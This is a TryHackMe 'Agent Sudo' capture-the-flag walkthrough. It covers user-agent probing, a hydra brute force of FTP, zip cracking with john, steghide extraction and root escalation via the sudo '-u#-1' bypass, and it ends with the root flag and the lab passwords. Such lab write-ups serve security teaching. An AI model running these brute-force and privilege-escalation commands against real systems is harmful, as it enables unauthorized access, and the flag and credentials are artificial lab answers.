---
title: Agent Sudo
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Agent Sudo
  machine on TryHackMe.
slug: agent-sudo
---





> namp

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```

> after going to website it show

```
Dear agents,  
  
Use your own **codename** as user-agent to access the site.  
  
From,  
Agent R

```

> So I use like this to find is there anything on agent names field hide

```
❯ curl -A "R" -L 10.201.60.51
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>

```

> So after many trying different agents i find something value

```
❯ curl -A "C" -L 10.201.60.51
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

```

> so found name lets do it to find pwd for ftp

```
❯ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.201.60.51 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-11 09:57:50
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.201.60.51:21/
[STATUS] 203.00 tries/min, 203 tries in 00:01h, 14344196 to do in 1177:42h, 16 active
[21][ftp] host: 10.201.60.51   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-11 09:59:25

```

> in ftp

```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png


```

> after download,

```
❯ ls -la
total 84
drwxrwxr-x  2 kali kali  4096 Oct 11 10:04 .
drwxrwxr-x 13 kali kali  4096 Oct 11 10:01 ..
-rw-rw-r--  1 kali kali 33143 Oct 29  2019 cute-alien.jpg
-rw-rw-r--  1 kali kali 34842 Oct 29  2019 cutie.png
-rw-rw-r--  1 kali kali   217 Oct 29  2019 To_agentJ.txt


```

> agent say something so extract cutie.png using `binwalk`

```
❯ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

❯ ls -la
total 88
drwxrwxr-x  3 kali kali  4096 Oct 11 10:07 .
drwxrwxr-x 13 kali kali  4096 Oct 11 10:01 ..
-rw-rw-r--  1 kali kali 33143 Oct 29  2019 cute-alien.jpg
-rw-rw-r--  1 kali kali 34842 Oct 29  2019 cutie.png
drwxrwxr-x  2 kali kali  4096 Oct 11 10:07 _cutie.png.extracted
-rw-rw-r--  1 kali kali   217 Oct 29  2019 To_agentJ.txt

```

> so in extracted file has zip so have to find pwd

```
❯ ls -la
total 324
drwxrwxr-x 2 kali kali   4096 Oct 11 10:07 .
drwxrwxr-x 3 kali kali   4096 Oct 11 10:07 ..
-rw-rw-r-- 1 kali kali 279312 Oct 11 10:07 365
-rw-rw-r-- 1 kali kali  33973 Oct 11 10:07 365.zlib
-rw-rw-r-- 1 kali kali    280 Oct 11 10:07 8702.zip

```

> so have to find zip pwd

```
❯ zip2john 8702.zip > forjohn
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2025-10-11 10:12) 0.8403g/s 20652p/s 20652c/s 20652C/s christal..280789
Use

```

> find pwd `alien`  after extract found txt

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

> use cyberchef to convert into something and found something `Area51`

```
❯ steghide info cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes


```

> see it has somethinf important txt to see extract that

```
❯ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
❯ ls -la
total 92
drwxrwxr-x  3 kali kali  4096 Oct 11 10:25 .
drwxrwxr-x 13 kali kali  4096 Oct 11 10:01 ..
-rw-rw-r--  1 kali kali 33143 Oct 29  2019 cute-alien.jpg
-rw-rw-r--  1 kali kali 34842 Oct 29  2019 cutie.png
drwxrwxr-x  2 kali kali  4096 Oct 11 10:18 _cutie.png.extracted
-rw-rw-r--  1 kali kali   181 Oct 11 10:25 message.txt
-rw-rw-r--  1 kali kali   217 Oct 29  2019 To_agentJ.txt
❯ cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris


```

> find something so using that `james` & `hackerrules!` log to ssh

> in home has flag and something image to invistigate i get that to my machine using python server after , time for privesc

```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash


```


> search on google `(allroot )/bin/bash exploit` and found something important and command you can run to read files as root `sudo -u#-1 /bin/bash`


```
james@agent-sudo:~$ cat /root/root.txt
cat: /root/root.txt: Permission denied
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cd /root
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 


```